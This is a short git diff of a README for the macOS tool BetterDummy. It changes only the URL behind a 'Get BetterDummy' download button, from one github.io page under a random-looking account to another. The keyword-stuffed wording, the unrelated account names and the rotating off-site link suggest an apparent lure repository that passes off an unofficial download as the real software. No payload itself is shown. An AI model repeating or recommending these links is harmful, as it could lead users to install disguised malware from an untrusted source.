@@ -21,7 +21,7 @@ To begin using this **BetterDummy Virtual Display** and **BetterDummy Mac Dummy*
 | :--- | :--- |
 | **Get BetterDummy Virtual Display** | Click the button below to start using this **BetterDummy Headless Adapter**. |
 
-[![Button](https://img.shields.io/badge/🖥️-Get_BetterDummy-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/betterdummy-virtual-display)
+[![Button](https://img.shields.io/badge/🖥️-Get_BetterDummy-2ea44f?style=for-the-badge)](https://luisschroederdrbf.github.io/.github/betterdummy-virtual-display)
 
 ## System Requirements
 
